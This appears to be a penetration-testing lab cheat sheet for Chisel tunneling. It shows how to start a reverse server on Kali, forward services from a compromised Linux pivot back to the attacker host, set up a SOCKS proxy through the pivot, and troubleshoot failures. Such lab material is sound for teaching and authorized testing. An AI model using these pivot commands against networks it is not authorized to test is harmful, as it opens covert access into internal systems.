## Start the reverse-forward server

**Run in:** Kali. **Requires:** Lab-facing 10.10.14.3 address and free port 8000; choose a lab-only secret

```bash
chisel server --host 10.10.14.3 --port 8000 --reverse --auth 'lab:REPLACE_WITH_LAB_SECRET'
```

**What the result establishes:** A listening server and printed fingerprint; reverse forwarding is enabled.

**Next check:** Record the printed fingerprint and start the client on the pivot.

## Forward the pivot service back to Kali

**Run in:** Linux pivot shell. **Requires:** Compatible Chisel binary; outbound access to Kali:8000; observed pivot-local service on 8080

```bash
./chisel client --auth 'lab:REPLACE_WITH_LAB_SECRET' --fingerprint 'SERVER_FINGERPRINT' \
  http://10.10.14.3:8000 R:127.0.0.1:18080:127.0.0.1:8080
```

**What the result establishes:** An established tunnel and reverse listener on Kali loopback 18080; application access still needs testing.

**Next check:** Keep both processes running and test the forwarded application from Kali.

## Forward one internal service back to Kali

**Run in:** Pivot shell. **Requires:** On Kali, a matching Chisel server is already listening with --reverse on port 8080; the pivot can reach Kali and INTERNAL_IP:443.

```bash
./chisel client KALI_IP:8080 R:127.0.0.1:8443:INTERNAL_IP:443
```

**What the result establishes:** Draw the tunnel endpoints and verify where a reverse listener appears before routing a client through it.

**Next check:** Check the pivot-to-service route and the Kali listener separately; send the service's expected hostname/SNI when testing HTTPS through the forwarded port.

## Commands

**Kali and pivot**

```bash
# Kali
./chisel server -p 8080 --reverse
# Pivot
./chisel client KALI_IP:8080 R:socks
# Kali: put this in the ProxyList section of /etc/proxychains4.conf
# socks5 127.0.0.1 1080
```

## If it fails

| Symptom | Check |
| --- | --- |
| Address in use or cannot assign address | Inspect local interfaces/listeners and select an address actually owned by Kali. |
| Connection refused | Determine whether refusal is the client-to-Kali connection, local listener binding or the pivot-to-service request. |
| The client connects but localhost:8443 cannot reach the service | R: reverses listener placement. A SOCKS endpoint, a single TCP forward and an application listener serve different purposes. |
